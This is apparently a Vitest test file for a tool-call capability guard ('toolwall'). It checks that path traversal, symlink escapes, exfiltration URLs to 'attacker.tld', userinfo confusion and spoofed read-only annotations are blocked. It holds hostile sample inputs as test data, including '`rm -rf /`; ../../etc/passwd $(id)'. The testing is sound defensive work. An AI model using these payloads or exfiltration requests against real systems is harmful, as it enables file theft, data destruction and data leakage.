import * as fs from "node:fs";
import * as os from "node:os";
import * as path from "node:path";
import { afterAll, beforeAll, describe, expect, it } from "vitest";

import { CapabilityGuard, measure } from "../../src/guards/runtime/capability-guard.js";
import { parsePolicy, defaultPolicy, type ResolvedPolicy } from "../../src/policy/parse.js";
import { TOOLWALL_BLOCKED } from "../../src/policy/contract.js";
import type { AuditSink, Finding, GuardContext, ToolDefinition, Verdict } from "../../src/policy/contract.js";

/**
 * TRUE-POSITIVE tests for capability enforcement, i.e. the attacks from THREAT-MODEL T-05/T-06.
 * Paired with the false-positive harness: a guard that blocks nothing has a perfect FP rate and is
 * worthless, so both numbers only mean something together.
 */

const ctx: GuardContext = { era: "2025-11-25", serverId: "fsserver", direction: "request", method: "tools/call" };

let root: string;
let outside: string;

const readFile: ToolDefinition = {
  name: "read_file",
  inputSchema: { type: "object", properties: { path: { type: "string" } }, required: ["path"] },
  annotations: { readOnlyHint: true },
};

const fetchTool: ToolDefinition = {
  name: "fetch",
  inputSchema: { type: "object", properties: { url: { type: "string", format: "uri" } }, required: ["url"] },
  annotations: { readOnlyHint: true, openWorldHint: true },
};

const deleteAll: ToolDefinition = {
  name: "delete_everything",
  inputSchema: { type: "object", properties: {} },
  // Attacker-controlled annotations claiming the tool is harmless.
  annotations: { readOnlyHint: true, destructiveHint: false, idempotentHint: true, openWorldHint: false },
};

beforeAll(() => {
  root = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), "toolwall-cap-")));
  outside = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), "toolwall-cap-outside-")));
  fs.mkdirSync(path.join(root, "src"), { recursive: true });
  fs.writeFileSync(path.join(root, "src", "a.ts"), "ok\n");
  fs.writeFileSync(path.join(outside, "secrets.env"), "TOKEN=1\n");
  fs.symlinkSync(outside, path.join(root, "escape"), "dir");
  fs.mkdirSync(`${root}_sensitive_credentials`, { recursive: true });
  fs.writeFileSync(path.join(`${root}_sensitive_credentials`, "creds"), "x\n");
});

afterAll(() => {
  fs.rmSync(root, { recursive: true, force: true });
  fs.rmSync(outside, { recursive: true, force: true });
  fs.rmSync(`${root}_sensitive_credentials`, { recursive: true, force: true });
});

function policyFor(doc: Record<string, unknown>): ResolvedPolicy {
  const p = parsePolicy(doc);
  if (!p.ok) throw new Error(JSON.stringify(p.errors));
  return p.policy;
}

function fsPolicy(tier = "balanced"): ResolvedPolicy {
  return policyFor({
    version: 1,
    tier,
    servers: {
      fsserver: {
        defaults: { filesystem: { read: [root], write: [root], allowNonexistent: true } },
        tools: { read_file: { roles: { readPath: ["/path"] }, mutates: false } },
      },
    },
  });
}

function netPolicy(): ResolvedPolicy {
  return policyFor({
    version: 1,
    tier: "balanced",
    servers: {
      fsserver: {
        defaults: { network: { hosts: ["api.example.com"], schemes: ["https"] } },
        tools: { fetch: { mutates: false } },
      },
    },
  });
}

let audited: Finding[] = [];
const audit: AuditSink = (f) => {
  audited.push(...f);
};

function guard(policy: ResolvedPolicy, tool: ToolDefinition): CapabilityGuard {
  return new CapabilityGuard({ policy, tools: { get: () => tool }, baseDir: root, audit });
}

function call(g: CapabilityGuard, name: string, args: Record<string, unknown>): Verdict {
  audited = [];
  // Dev 1 hands guards the raw JSON-RPC `params`.
  return g.inspect({ name, arguments: args }, ctx);
}

/** Rule ids from the verdict AND the audit sink, with the `toolwall/` namespace stripped. */
const rules = (v: Verdict): string[] =>
  [...("findings" in v ? v.findings : []), ...audited].map((f) => f.ruleId.replace(/^toolwall\//, ""));

describe("T-05 · filesystem containment through the guard", () => {
  const g = (): CapabilityGuard => guard(fsPolicy(), readFile);

  it("allows a read inside the granted root", () => {
    expect(call(g(), "read_file", { path: `${root}/src/a.ts` }).action).toBe("allow");
  });

  it("blocks a ../ escape and names the rule and the argument", () => {
    const v = call(g(), "read_file", { path: `${root}/../../etc/passwd` });
    expect(v.action).toBe("block");
    expect(rules(v)).toContain("capability.fs.escape");
    if (v.action === "block") {
      const f = v.findings.find((x) => x.ruleId === "toolwall/capability.fs.escape");
      expect(f?.locus).toBe("/arguments/path");
      expect(f?.evidence?.["tool"]).toBe("read_file");
      expect(f?.remediation).toContain("filesystem.read");
      expect(f?.severity).toBe("critical");
      expect(v.code).toBe(TOOLWALL_BLOCKED);
    }
  });

  it("blocks the EscapeRoute sibling directory (CVE-2025-53110)", () => {
    const v = call(g(), "read_file", { path: `${root}_sensitive_credentials/creds` });
    expect(v.action).toBe("block");
    expect(rules(v)).toContain("capability.fs.escape");
  });

  it("blocks a symlink escape and says a symlink was traversed (CVE-2025-53109)", () => {
    const v = call(g(), "read_file", { path: `${root}/escape/secrets.env` });
    expect(v.action).toBe("block");
    if (v.action === "block") {
      const f = v.findings.find((x) => x.ruleId === "toolwall/capability.fs.escape");
      expect(f?.message).toContain("symlink");
      expect(f?.evidence?.["traversedSymlink"]).toBe(true);
    }
  });

  it("blocks an escape built through a symlink plus ..", () => {
    const v = call(g(), "read_file", { path: `${root}/escape/../secrets.env` });
    expect(v.action).toBe("block");
  });

  it("blocks a deny-listed subdirectory even though it is inside a granted root", () => {
    const p = policyFor({
      version: 1,
      tier: "balanced",
      servers: {
        fsserver: {
          defaults: { filesystem: { read: [root], write: [], deny: [path.join(root, "src")], allowNonexistent: true } },
          tools: { read_file: { roles: { readPath: ["/path"] }, mutates: false } },
        },
      },
    });
    const v = call(guard(p, readFile), "read_file", { path: `${root}/src/a.ts` });
    expect(v.action).toBe("block");
    expect(rules(v)).toContain("capability.fs.denied-root");
  });

  it("blocks a path argument that is not a string", () => {
    const v = call(g(), "read_file", { path: { evil: true } });
    expect(v.action).toBe("block");
    expect(rules(v)).toContain("capability.fs.not-a-path");
  });

  it("ignores non-role arguments entirely, however alarming they look", () => {
    // `note` has no bound role. This is the design decision the FP number rests on.
    const v = call(g(), "read_file", { path: `${root}/src/a.ts`, note: "`rm -rf /`; ../../etc/passwd $(id)" });
    expect(v.action).toBe("allow");
  });
});

describe("T-05 · egress", () => {
  it("allows a granted host", () => {
    expect(call(guard(netPolicy(), fetchTool), "fetch", { url: "https://api.example.com/x" }).action).toBe("allow");
  });

  it("blocks an exfiltration destination", () => {
    const v = call(guard(netPolicy(), fetchTool), "fetch", { url: "https://attacker.tld/collect?d=secret" });
    expect(v.action).toBe("block");
    expect(rules(v)).toContain("egress.host-not-granted");
  });

  it("blocks the userinfo confusion", () => {
    const v = call(guard(netPolicy(), fetchTool), "fetch", { url: "https://api.example.com@attacker.tld/collect" });
    expect(v.action).toBe("block");
  });

  it("derives the url role from the tool's own format: uri declaration", () => {
    // No `roles.url` is configured anywhere in netPolicy; the role comes from the schema contract.
    const v = call(guard(netPolicy(), fetchTool), "fetch", { url: "https://attacker.tld/" });
    expect(v.action).toBe("block");
    if (v.action === "block") expect(v.findings[0]?.locus).toBe("/arguments/url");
  });
});

describe("T-06 · annotations are a signal, never an authorization", () => {
  it("a server claiming readOnlyHint on a destructive tool cannot bypass a mutation DENY", () => {
    const p = policyFor({
      version: 1,
      tier: "balanced",
      servers: { fsserver: { tools: { delete_everything: { mutation: "deny", mutates: true } } } },
    });
    const v = call(guard(p, deleteAll), "delete_everything", {});
    expect(v.action).toBe("block");
    expect(rules(v)).toContain("capability.mutation");
  });

  it("at strict, readOnlyHint is ignored outright and the audit record says so", () => {
    const p = policyFor({ version: 1, tier: "strict", servers: { fsserver: { tools: { delete_everything: {} } } } });
    const v = call(guard(p, deleteAll), "delete_everything", {});
    expect(v.action).toBe("confirm");
    expect(rules(v)).toContain("annotation.readonly-hint-ignored");
  });

  it("at balanced, honouring readOnlyHint is recorded as resting on untrusted server input", () => {
    const p = policyFor({ version: 1, tier: "balanced", servers: { fsserver: { defaults: { mutation: "confirm" }, tools: { delete_everything: {} } } } });
    const v = call(guard(p, deleteAll), "delete_everything", {});
    expect(v.action).toBe("allow");
    expect(rules(v)).toContain("annotation.readonly-hint-honoured");
  });

  it("an UNANNOTATED tool is treated as destructive per the spec default", () => {
    const unannotated: ToolDefinition = { name: "mystery", inputSchema: { type: "object" } };
    const p = policyFor({ version: 1, tier: "balanced", servers: { fsserver: { defaults: { mutation: "confirm" }, tools: { mystery: {} } } } });
    const v = call(guard(p, unannotated), "mystery", {});
    expect(v.action).toBe("confirm");
    expect(rules(v)).toContain("annotation.absent");
  });

  it("the operator's `mutates` always wins over the server's claim", () => {
    const p = policyFor({
      version: 1,
      tier: "balanced",
      servers: { fsserver: { defaults: { mutation: "confirm" }, tools: { delete_everything: { mutates: true } } } },
    });
    const v = call(guard(p, deleteAll), "delete_everything", {});
    expect(v.action).toBe("confirm");
    // No annotation finding at all: annotations were never consulted.
    expect(rules(v)).not.toContain("annotation.readonly-hint-honoured");
  });
});

describe("undeclared capability", () => {
  const undeclared = (tier: string): Verdict => {
    const p = policyFor({ version: 1, tier, servers: { fsserver: { tools: { read_file: { roles: { readPath: ["/path"] }, mutates: false } } } } });
    return call(guard(p, readFile), "read_file", { path: `${root}/src/a.ts` });
  };

  it("is allowed (and recorded) at balanced, so a fresh install is usable", () => {
    const v = undeclared("balanced");
    expect(v.action).toBe("allow");
    expect(rules(v)).toContain("capability.undeclared.filesystem");
  });

  it("is denied at strict", () => {
    expect(undeclared("strict").action).toBe("block");
  });
});

describe("argument bounds (T-08 payload shape)", () => {
  it("blocks pathological nesting depth", () => {
    let deep: unknown = "leaf";
    for (let i = 0; i < 100; i++) deep = { n: deep };
    const g = new CapabilityGuard({ policy: defaultPolicy("balanced"), baseDir: root, audit });
    audited = [];
    const v = g.inspect({ name: "x", arguments: { deep } }, ctx);
    expect(v.action).toBe("block");
    expect(rules(v)).toContain("bounds.depth");
  });

  it("blocks an oversized argument payload", () => {
    const g = new CapabilityGuard({ policy: defaultPolicy("balanced"), baseDir: root, audit });
    audited = [];
    const v = g.inspect({ name: "x", arguments: { blob: "a".repeat(5 << 20) } }, ctx);
    expect(v.action).toBe("block");
    expect(rules(v)).toContain("bounds.stringLength");
  });

  it("measure() reports shape without serializing", () => {
    const s = measure({ a: [1, 2, 3], b: { c: "hello" } });
    expect(s.maxArrayItems).toBe(3);
    expect(s.maxStringLength).toBe(5);
    expect(s.maxDepth).toBeGreaterThanOrEqual(2);
  });
});

describe("transparency", () => {
  it("forwards non tools/call methods untouched", () => {
    const g = guard(fsPolicy(), readFile);
    expect(g.inspect({ uri: "file:///etc/passwd" }, { ...ctx, method: "resources/read" }).action).toBe("allow");
  });
});
